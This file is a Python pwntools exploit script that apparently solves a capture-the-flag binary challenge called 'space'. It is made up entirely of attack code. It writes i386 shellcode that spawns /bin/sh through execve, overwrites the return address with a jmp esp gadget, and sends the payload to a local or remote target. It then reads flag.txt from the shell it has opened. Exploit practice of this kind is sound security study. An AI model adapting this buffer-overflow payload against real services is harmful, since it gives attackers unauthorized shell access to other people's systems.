#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "i386"

def exploit(io):
    jmp_esp = 0x804919f
    shellcode_1 = asm("""
                        add esp, 0x40
                        xor ecx, ecx
                        xor edx, edx
                        jmp eax
                        """)
    shellcode_2 = asm("""
                        push ecx
                        push 0x68732f2f
                        push 0x6e69622f
                        mov ebx, esp
                        push 0xb
                        pop eax
                        int 0x80
                      """)
    
    payload = shellcode_2 + p32(jmp_esp) + shellcode_1
    io.sendafter(b"> ", payload)
    sleep(0.2)

    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./space")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    exploit(io)

if __name__ == "__main__":
    main()
